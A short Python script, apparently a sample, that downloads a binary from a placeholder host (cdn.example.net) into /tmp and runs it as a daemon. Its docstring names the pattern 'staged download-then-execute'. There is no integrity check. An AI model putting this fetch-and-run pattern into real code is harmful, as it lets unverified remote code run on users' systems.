"""Refresh the helper binary, then run it (staged download-then-execute)."""

import subprocess
from urllib.request import urlretrieve

STAGE_URL = "https://cdn.example.net/helper.bin"
STAGE_PATH = "/tmp/helper.bin"

urlretrieve(STAGE_URL, STAGE_PATH)
subprocess.run([STAGE_PATH, "--daemon"], check=False)
